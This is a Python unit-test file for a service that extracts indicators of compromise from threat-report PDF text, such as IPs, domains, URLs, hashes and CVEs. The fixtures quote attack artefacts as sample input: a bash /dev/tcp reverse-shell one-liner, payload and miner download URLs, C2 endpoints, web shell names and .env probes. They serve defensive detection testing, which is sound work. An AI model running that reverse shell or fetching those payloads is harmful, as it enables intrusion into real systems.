"""
Unit Tests for Deterministic IOC Extraction Service.
Module: PDF Processing & IOC Intelligence
"""

from backend.app.services.ioc_service import (
    PageText,
    clean_url,
    extract_iocs,
    is_email_local_part,
    is_private_ip,
    is_valid_domain,
    is_valid_ipv4,
    normalize_defanged,
)


def test_normalize_defanged():
    assert normalize_defanged("45[.]137[.]21[.]1") == "45.137.21.1"
    assert normalize_defanged("malicious(.)example(.)com") == "malicious.example.com"
    assert normalize_defanged("evil{.}org") == "evil.org"
    assert normalize_defanged("hxxps[:]//evil[.]com/gate") == "https://evil.com/gate"
    assert normalize_defanged("hxxp://insecure[dot]org") == "http://insecure.org"
    assert normalize_defanged("attacker[at]c2[.]net") == "attacker@c2.net"


def test_ipv4_validation():
    # Public & test IPs should be valid
    assert is_valid_ipv4("185.141.63.1") is True
    assert is_valid_ipv4("194.165.16.50") is True
    assert is_valid_ipv4("8.8.8.8") is True

    # RFC 1918 Private, loopback, link-local, multicast, and broadcast IPs should be filtered out
    assert is_valid_ipv4("192.168.1.1") is False
    assert is_valid_ipv4("10.0.0.1") is False
    assert is_valid_ipv4("172.16.5.4") is False
    assert is_valid_ipv4("127.0.0.1") is False
    assert is_valid_ipv4("169.254.10.5") is False
    assert is_valid_ipv4("224.0.0.1") is False
    assert is_valid_ipv4("255.255.255.255") is False

    # Invalid octets or numbers
    assert is_valid_ipv4("999.1.1.1") is False
    assert is_valid_ipv4("1.2.3.4.5") is False
    assert is_valid_ipv4("01.2.3.4") is False
    assert is_valid_ipv4("not_an_ip") is False


def test_ipv4_version_string_rejection():
    # Test strings like version numbers 1.2.3.4.5 are not extracted as IPs
    pages = [
        {
            "page_number": 1,
            "page_text": "Release version 1.2.3.4.5 was deployed. The actual C2 was 185.141.63.99.",
        }
    ]
    iocs = extract_iocs(pages)
    ips = [i["value"] for i in iocs if i["type"] == "ipv4"]
    assert "1.2.3.4" not in ips
    assert "185.141.63.99" in ips


def test_domain_validation():
    # Valid domains
    assert is_valid_domain("malicious-c2.com") is True
    assert is_valid_domain("sub.domain.threat.org") is True
    assert is_valid_domain("update.evil.xyz") is True

    # Exclude IP addresses
    assert is_valid_domain("45.137.21.1") is False

    # Exclude common file extensions
    assert is_valid_domain("report.pdf") is False
    assert is_valid_domain("payload.exe") is False
    assert is_valid_domain("document.docx") is False
    assert is_valid_domain("script.ps1") is False

    # Invalid domain syntax
    assert is_valid_domain("-bad.com") is False
    assert is_valid_domain("no_tld") is False


def test_defanged_domains_extraction():
    pages = [
        {
            "page_number": 1,
            "page_text": "Attacker domains: evil[.]com, backup(.)net, and c2{.}org were registered.",
        }
    ]
    iocs = extract_iocs(pages)
    domains = [i["value"] for i in iocs if i["type"] == "domain"]
    assert "evil.com" in domains
    assert "backup.net" in domains
    assert "c2.org" in domains


def test_cve_extraction():
    pages = [
        {
            "page_number": 1,
            "page_text": "The adversary leveraged cve-2023-38831, CVE_2021_44228, and CVE-2020-0601 to gain execution.",
        }
    ]
    iocs = extract_iocs(pages)
    cves = [i for i in iocs if i["type"] == "cve"]

    assert len(cves) == 3
    assert cves[0]["value"] == "CVE-2023-38831"
    assert cves[0]["source_page"] == 1
    assert "cve-2023-38831" in cves[0]["evidence"].lower()
    assert cves[1]["value"] == "CVE-2021-44228"
    assert cves[2]["value"] == "CVE-2020-0601"


def test_hash_extraction_separation():
    # Test MD5, SHA1, and SHA256 in the same text without substring collisions
    md5_hash = "d41d8cd98f00b204e9800998ecf8427e"
    sha1_hash = "da39a3ee5e6b4b0d3255bfef95601890afd80709"
    sha256_hash = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"

    pages = [
        {
            "page_number": 2,
            "page_text": f"Hashes recovered:\nMD5: {md5_hash.upper()}\nSHA-1: {sha1_hash}\nSHA-256: {sha256_hash}",
        }
    ]
    iocs = extract_iocs(pages)

    md5_results = [i for i in iocs if i["type"] == "md5"]
    sha1_results = [i for i in iocs if i["type"] == "sha1"]
    sha256_results = [i for i in iocs if i["type"] == "sha256"]

    assert len(md5_results) == 1
    assert md5_results[0]["value"] == md5_hash
    assert md5_results[0]["source_page"] == 2

    assert len(sha1_results) == 1
    assert sha1_results[0]["value"] == sha1_hash

    assert len(sha256_results) == 1
    assert sha256_results[0]["value"] == sha256_hash


def test_url_and_defanging_extraction():
    pages = [
        {
            "page_number": 3,
            "page_text": "Stager downloaded from hxxps[:]//evil-cdn[.]com/payload.bin and beaconed to http://threat.net:8080/gate.",
        }
    ]
    iocs = extract_iocs(pages)

    urls = [i for i in iocs if i["type"] == "url"]
    domains = [i for i in iocs if i["type"] == "domain"]

    assert any(u["value"] == "https://evil-cdn.com/payload.bin" for u in urls)
    assert any(u["value"] == "http://threat.net:8080/gate" for u in urls)
    assert urls[0]["source_page"] == 3
    assert any(d["value"] == "evil-cdn.com" for d in domains)


def test_ipv4_defanging_and_private_filtering():
    pages = [
        {
            "page_number": 4,
            "page_text": "Attacker IP: 185.141.63[.]22 was active. Internal probe from 192.168.1[.]50 was discarded.",
        }
    ]
    iocs = extract_iocs(pages)
    ips = [i for i in iocs if i["type"] == "ipv4"]

    assert len(ips) == 1
    assert ips[0]["value"] == "185.141.63.22"
    assert ips[0]["source_page"] == 4
    assert "185.141.63[.]22" in ips[0]["evidence"] or "185.141.63.22" in ips[0]["evidence"]


def test_page_text_backward_compatibility():
    # Test that both 'page_text' and 'text' keys work seamlessly
    pages_with_page_text = [{"page_number": 1, "page_text": "IOC: 185.141.63.10"}]
    pages_with_legacy_text = [{"page_number": 1, "text": "IOC: 185.141.63.20"}]

    iocs1 = extract_iocs(pages_with_page_text)
    iocs2 = extract_iocs(pages_with_legacy_text)

    assert iocs1[0]["value"] == "185.141.63.10"
    assert iocs2[0]["value"] == "185.141.63.20"


def test_deduplication_across_pages():
    pages = [
        {
            "page_number": 1,
            "page_text": "Initial discovery of C2 domain: bad-actor[.]com",
        },
        {
            "page_number": 2,
            "page_text": "Secondary beacon sent to bad-actor.com again.",
        },
    ]
    iocs = extract_iocs(pages)
    domains = [i for i in iocs if i["type"] == "domain" and i["value"] == "bad-actor.com"]

    # Must be deduplicated to exactly one entry, preserving the first occurrence page
    assert len(domains) == 1
    assert domains[0]["source_page"] == 1


def test_defanged_url_path_domain_masking():
    # Defanged URL with a domain-like path segment
    pages = [
        {
            "page_number": 1,
            "page_text": "Payload retrieved from hxxps[:]//evil.com/download/sub.payload-host.org/setup.bin directly.",
        }
    ]
    iocs = extract_iocs(pages)
    urls = [i for i in iocs if i["type"] == "url"]
    domains = [i for i in iocs if i["type"] == "domain"]

    assert len(urls) == 1
    assert urls[0]["value"] == "https://evil.com/download/sub.payload-host.org/setup.bin"

    # evil.com should be extracted as the URL host domain
    assert any(d["value"] == "evil.com" for d in domains)
    # The path segment 'sub.payload-host.org' must NOT be extracted as a false domain IOC
    assert not any(d["value"] == "sub.payload-host.org" for d in domains)


def test_short_defanged_ip_evidence_centering():
    # Long line with short defanged IP near the end
    prefix = "Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam. Adversary fallback IP was "
    pages = [
        {
            "page_number": 1,
            "page_text": prefix + "1.1.1[.]1 and proceeded to exfiltrate database records.",
        }
    ]
    iocs = extract_iocs(pages)
    ips = [i for i in iocs if i["type"] == "ipv4"]

    assert len(ips) == 1
    assert ips[0]["value"] == "1.1.1.1"
    # Evidence must contain the indicator and be centered around it, not just the start of line
    assert "1.1.1[.]1" in ips[0]["evidence"] or "1.1.1.1" in ips[0]["evidence"]


# ------------------------------------------------------------------------------
# Regression Tests for Sanity Audit Findings
# ------------------------------------------------------------------------------

def test_regression_ipv4_version_numbers_and_user_agents():
    """
    Ensures software version strings, product release numbers, and browser User-Agent
    tokens are rejected while genuine adversary IPs (even in shell commands) are retained.
    """
    pages = [
        {
            "page_number": 1,
            "page_text": (
                "Observed User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.76\n"
                "Reporting Database (RDB) version 2.0.0.1 and earlier are vulnerable.\n"
                "Citrix ADC and Gateway version 13.0 all supported builds before 13.0.47.24\n"
                "VMware Workspace ONE Access, versions 21.08.0.1, 21.08.0.0, 20.10.0.1, 20.10.0.0\n"
                "Reverse shell executed: bash -i >& /dev/tcp/179.43.175.38/6870 0>&1\n"
                "Attacker C2 connection from 200.172.238.135 established."
            ),
        }
    ]
    iocs = extract_iocs(pages)
    ips = [i["value"] for i in iocs if i["type"] == "ipv4"]

    # False positives must NOT be extracted
    assert "116.0.0.0" not in ips
    assert "2.0.0.1" not in ips
    assert "13.0.47.24" not in ips
    assert "20.10.0.1" not in ips
    assert "20.10.0.0" not in ips

    # Legitimate threat IPs MUST be extracted
    assert "179.43.175.38" in ips
    assert "200.172.238.135" in ips


def test_regression_domain_file_extensions_and_configs():
    """
    Ensures script, template, certificate, and configuration file names are not extracted as domains.
    """
    pages = [
        {
            "page_number": 1,
            "page_text": (
                "Attacker uploaded web shells jtest.jsp, app.jsp, resource.aspx, and eval-stdin.php.\n"
                "Configuration files system-config.properties, env.dist, and certificate fd86ald0.pem were read.\n"
                "Transport script tcp-http.go was executed.\n"
                "Active C2 communications: c2-node.safe-vpn.mobi and update.asyncfox.xyz"
            ),
        }
    ]
    iocs = extract_iocs(pages)
    domains = [i["value"] for i in iocs if i["type"] == "domain"]

    assert "jtest.jsp" not in domains
    assert "app.jsp" not in domains
    assert "resource.aspx" not in domains
    assert "eval-stdin.php" not in domains
    assert "system-config.properties" not in domains
    assert "env.dist" not in domains
    assert "fd86ald0.pem" not in domains
    assert "tcp-http.go" not in domains

    # Legitimate adversary domains MUST be extracted
    assert "c2-node.safe-vpn.mobi" in domains
    assert "update.asyncfox.xyz" in domains


def test_regression_domain_method_calls_and_av_signatures():
    """
    Ensures programming language method invocations, code packages, and antivirus
    threat detection names are not extracted as domain IOCs.
    """
    pages = [
        {
            "page_number": 1,
            "page_text": (
                "Insecure deserialization via JavaScriptSerializer.Deserialize() and xmlSerializer.Deserialize().\n"
                "Executed socket.socket() and ate.utility.Execute(command).\n"
                "Detection signatures: Trojan/Win64.Shelma, GrayWare/Win32.Rozena.j, TR/Crypt.XPACK.Gen7, and Vir.IT eXplorer.\n"
                "Classification marking: CISA MAR-10430311.c1.v1.CLEAR.\n"
                "Legitimate adversary domain: 149.248.35.200.sslip.io."
            ),
        }
    ]
    iocs = extract_iocs(pages)
    domains = [i["value"] for i in iocs if i["type"] == "domain"]

    assert "javascriptserializer.deserialize" not in domains
    assert "xmlserializer.deserialize" not in domains
    assert "socket.socket" not in domains
    assert "ate.utility.execute" not in domains
    assert "win64.shelma" not in domains
    assert "win32.rozena" not in domains
    assert "crypt.xpack" not in domains
    assert "vir.it" not in domains
    assert "mar-10430311.c1.v1.clear" not in domains

    # Legitimate threat domain preserved
    assert "149.248.35.200.sslip.io" in domains


def test_regression_reference_urls_and_authorities():
    """
    Ensures benign government advisories, vendor bulletin URLs, and documentation
    placeholders are filtered out, while malicious plain-text and defanged payload URLs are preserved.
    """
    pages = [
        {
            "page_number": 1,
            "page_text": (
                "For TLP details, consult http://www.cisa.gov/tlp.\n"
                "Patch advisory: https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882.\n"
                "NCSC Guidance: https://www.ncsc.gov.uk/guidance/mitigating-malware.\n"
                "Example URL in documentation: http://www.example.com/test.html\n"
                "Malware payload staged at hxxps://mc.rockylinux[.]si/seoforce/triggers/files/evil.txt\n"
                "Mining binary retrieved from http://download.asyncfox.xyz/download/xmrig.x86_64\n"
                "Direct C2 endpoint: http://45.95.147.236/tmp.x86_64"
            ),
        }
    ]
    iocs = extract_iocs(pages)
    urls = [i["value"] for i in iocs if i["type"] == "url"]
    domains = [i["value"] for i in iocs if i["type"] == "domain"]

    # Benign reference URLs must be excluded
    assert not any("cisa.gov" in u for u in urls)
    assert not any("microsoft.com" in u for u in urls)
    assert not any("ncsc.gov.uk" in u for u in urls)
    assert not any("example.com" in u for u in urls)

    # Authority domains must not be added to domain IOCs
    assert "cisa.gov" not in domains
    assert "www.cisa.gov" not in domains
    assert "microsoft.com" not in domains
    assert "www.ncsc.gov.uk" not in domains

    # Legitimate threat URLs must be extracted
    assert "https://mc.rockylinux.si/seoforce/triggers/files/evil.txt" in urls
    assert "http://download.asyncfox.xyz/download/xmrig.x86_64" in urls
    assert "http://45.95.147.236/tmp.x86_64" in urls


def test_regression_cve_footnote_normalization():
    """
    Ensures CVE identifiers corrupted by superscript footnote concatenation in PDFs
    (e.g. CVE-2024-938038 from footnote 38) are correctly normalized to the genuine CVE.
    """
    pages = [
        {
            "page_number": 1,
            "page_text": (
                "Lors d'un incident, un attaquant a corrigé lui-même les vulnérabilités "
                "CVE-2024-8190, CVE-2024-8963 et CVE-2024-938038, après les avoir exploitées.\n"
                "38 Vulnérabilités affectant les équipements Ivanti CSA."
            ),
        }
    ]
    iocs = extract_iocs(pages)
    cves = [i["value"] for i in iocs if i["type"] == "cve"]

    # Corrupted 6-digit identifier must be resolved
    assert "CVE-2024-938038" not in cves
    # Genuine CVEs must be present
    assert "CVE-2024-8190" in cves
    assert "CVE-2024-8963" in cves
    assert "CVE-2024-9380" in cves


def test_regression_platform_hosting_urls_and_ioc_drops():
    """
    Ensures platform-hosted URLs (GitHub, Pastebin) are properly handled:
    - Defanged adversary tools in IOC listings (e.g. filemanager) are retained.
    - Valid line-wrapped tool download endpoints (/releases/download) are reconstructed and retained.
    - Raw payload URLs (/raw/, payload extensions) are retained.
    - Trailing slash followed by unrelated prose is NOT appended.
    - Trailing hyphens are NOT joined to unrelated next lines.
    - Defanged platform URLs lacking threat/IOC context remain filtered.
    - Ordinary undefanged documentation and repository references are filtered.
    - Unrelated reference-domain filters (cisa.gov, etc.) remain intact.
    """
    pages = [
        {
            "page_number": 1,
            "page_text": (
                "Generic file managers dropped through eval-stdin.php:\n"
                "hxxps://github[.]com/alexantr/filemanager\n"
                "hxxps://github[.]com/prasathmani/tinyfilemanager\n"
                "Observed tool download:\n"
                "https://github[.]com/kost/\n"
                "revsocks/releases/download\n"
                "Raw payload staged at https://pastebin.com/raw/malware123\n"
                "Executable payload: hxxp://raw.githubusercontent.com/user/repo/master/payload.php\n"
                "Defender scanning tool: https://github.com/sl4cky/CVE-2018-7600-Masschecker/blob/master/Drupalgeddon-mass.py\n"
                "Defense guidance: https://github.com/nsacyber/Mitigating-Web-Shells\n"
                "Advisory link: https://www.cisa.gov/news-events/cybersecurity-advisories/aa24-016a\n"
                "Adversary C2 endpoint: http://45.95.147.236/tmp.x86_64\n"
                "Documentation link: hxxps://github[.]com/benign-org/docs\n"
                "Archived documentation: https://github.com/project/docs/\n"
                "This repository contains general documentation and developer guides.\n"
                "Repository slug: https://github.com/project/repo-slug-\n"
                "Next line contains unrelated release instructions."
            ),
        }
    ]
    iocs = extract_iocs(pages)
    urls = [i["value"] for i in iocs if i["type"] == "url"]

    # Defanged tool URLs in IOC sections MUST be retained
    assert "https://github.com/alexantr/filemanager" in urls
    assert "https://github.com/prasathmani/tinyfilemanager" in urls

    # Reconstructed line-wrapped tool download URL MUST be retained
    assert "https://github.com/kost/revsocks/releases/download" in urls

    # Raw payload and binary URLs MUST be retained
    assert "https://pastebin.com/raw/malware123" in urls
    assert "http://raw.githubusercontent.com/user/repo/master/payload.php" in urls
    assert "http://45.95.147.236/tmp.x86_64" in urls

    # Trailing slash followed by unrelated prose MUST NOT append prose to URL
    assert not any("docs/This" in u for u in urls)

    # Trailing hyphen MUST NOT append next line to URL
    assert not any("repo-slug-Next" in u for u in urls)

    # Defanged platform URL lacking threat/IOC context MUST remain filtered
    assert "https://github.com/benign-org/docs" not in urls

    # Ordinary defensive tools and documentation references MUST be filtered
    assert not any("sl4cky" in u for u in urls)
    assert not any("nsacyber" in u for u in urls)

    # Unrelated reference domain filters remain intact
    assert not any("cisa.gov" in u for u in urls)


def test_regression_surge_sh_platform_url_and_shell_script_distinction():
    """
    Ensures platform-hosted .sh URLs (e.g. Surge-hosted config drops) are retained as URLs,
    while standalone shell script filenames (deploy.sh) are not falsely extracted as domains.
    """
    pages = [
        {
            "page_number": 8,
            "page_text": (
                "Example malware drops through eval-stdin.php:\n"
                "hxxp://tangible-drink.surge[.]sh/configx.txt\n"
                "Execution relied on running deploy.sh and setup.sh on the target system.\n"
                "The adversary also staged payloads on c2-active.net."
            ),
        }
    ]
    iocs = extract_iocs(pages)
    urls = [i["value"] for i in iocs if i["type"] == "url"]
    domains = [i["value"] for i in iocs if i["type"] == "domain"]

    # Surge.sh URL must be successfully extracted
    assert "http://tangible-drink.surge.sh/configx.txt" in urls

    # Shell scripts must NOT be extracted as domain IOCs
    assert "deploy.sh" not in domains
    assert "setup.sh" not in domains

    # Platform host itself must not be registered as an adversary domain IOC
    assert "tangible-drink.surge.sh" not in domains
    assert "surge.sh" not in domains

    # Genuine threat domain must be extracted
    assert "c2-active.net" in domains


def test_regression_domain_false_positives_recon_and_extensions():
    """
    Ensures reconnaissance target files, internal suffixes, and reference authorities
    are not falsely extracted as domain indicators:
    - stopransomware.gov (reference authority)
    - maui.evd (file extension)
    - env.production, env.development, env.old (recon target configs)
    - eval-stdin.php.dev (URI target script)
    - raw.githubusercontent.com (platform hosting domain)
    """
    pages = [
        {
            "page_number": 1,
            "page_text": (
                "Report published by StopRansomware: see stopransomware.gov for details.\n"
                "Artifacts recovered: maui.exe, maui.log, maui.evd, and maui.key.\n"
                "Target scan URIs: /.env.production, /.env.development.local, /.env.old, /.env.project.\n"
                "Web shell probes to /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php.dev.\n"
                "Adversary staged code on raw.githubusercontent.com.\n"
                "Legitimate C2 communication observed to malicious-command.net."
            ),
        }
    ]
    iocs = extract_iocs(pages)
    domains = [i["value"] for i in iocs if i["type"] == "domain"]

    # Authorities and platform domains must not be domain IOCs
    assert "stopransomware.gov" not in domains
    assert "raw.githubusercontent.com" not in domains

    # File extensions and recon configs must not be domain IOCs
    assert "maui.evd" not in domains
    assert "env.production" not in domains
    assert "env.development.local" not in domains
    assert "env.old" not in domains
    assert "env.project" not in domains
    assert "eval-stdin.php.dev" not in domains

    # Genuine domain must be extracted
    assert "malicious-command.net" in domains


def test_email_local_part_suppression():
    """
    Ensures dot-delimited email usernames ending in valid gTLDs (e.g. .reveal, .download, .pro)
    are not falsely extracted as network domains:
    - personal.information.reveal@gmail.com -> personal.information.reveal is suppressed
    - confedicial.datas.download@protonmail.com -> confedicial.datas.download is suppressed
    - defanged attacker.recon.download[at]protonmail.com -> attacker.recon.download is suppressed
    - Standalone legitimate domains with the same TLD (e.g. malware-payload.download) remain extracted
    - Email host domain (e.g. protonmail.com, company.org) extraction is not broken
    """
    pages = [
        {
            "page_number": 1,
            "page_text": (
                "Phishing contacts: personal.information.reveal@gmail.com; "
                "confedicial.datas.download@protonmail.com; "
                "and defanged analyst.test.reveal[at]security-corp.com.\n"
                "Attacker exfiltration server was hosted at malware-payload.download.\n"
                "Secondary C2 infrastructure: active-threat.pro."
            ),
        }
    ]
    iocs = extract_iocs(pages)
    domains = [i["value"] for i in iocs if i["type"] == "domain"]

    # Email local-parts must NOT be extracted as domains
    assert "personal.information.reveal" not in domains
    assert "confedicial.datas.download" not in domains
    assert "analyst.test.reveal" not in domains

    # Legitimate domains with modern TLDs must still be extracted
    assert "malware-payload.download" in domains
    assert "active-threat.pro" in domains
    assert "security-corp.com" in domains



# --- Regression tests from code review (fix/ioc-extraction-review) ---

def _values(text):
    from backend.app.services.ioc_service import extract_iocs
    return {(i["type"], i["value"]) for i in extract_iocs([{"page_number": 1, "page_text": text}])}


def test_code_identifiers_and_markdown_files_are_not_domains():
    found = _values("See readme.md, then window.location and process.exit and document.write for details.")
    assert not any(t == "domain" for t, _ in found)


def test_real_tlds_still_extracted():
    found = _values("C2 at evil-update.top, bad-site[.]ru and xn--80ak6aa92e.com")
    assert ("domain", "evil-update.top") in found
    assert ("domain", "bad-site.ru") in found
    assert ("domain", "xn--80ak6aa92e.com") in found


def test_onion_domains_still_extracted():
    found = _values("Leak site: omx5iqrdbsoitf3q4xexrqw5r5tfw7vp3vl3li3lfo7saabxazshnead.onion")
    assert ("domain", "omx5iqrdbsoitf3q4xexrqw5r5tfw7vp3vl3li3lfo7saabxazshnead.onion") in found


def test_seven_digit_cve_preserved_and_footnote_still_stripped():
    from backend.app.services.ioc_service import normalize_cve
    assert normalize_cve("CVE-2017-1000117") == "CVE-2017-1000117"
    assert normalize_cve("CVE-2024-938038") == "CVE-2024-9380"


def test_rfc5737_documentation_ips_excluded():
    found = _values("Example hosts 192.0.2.10, 198.51.100.7 and 203.0.113.5; real C2 185.220.101.1")
    assert {v for t, v in found if t == "ipv4"} == {"185.220.101.1"}


def test_public_email_and_storage_providers_not_domains():
    found = _values("Contact karakurtlair@gmail.com or x@protonmail.com; data exfiltrated to Mega.nz via evil-drop.top")
    domains = {v for t, v in found if t == "domain"}
    assert "gmail.com" not in domains and "protonmail.com" not in domains and "mega.nz" not in domains
    assert "evil-drop.top" in domains
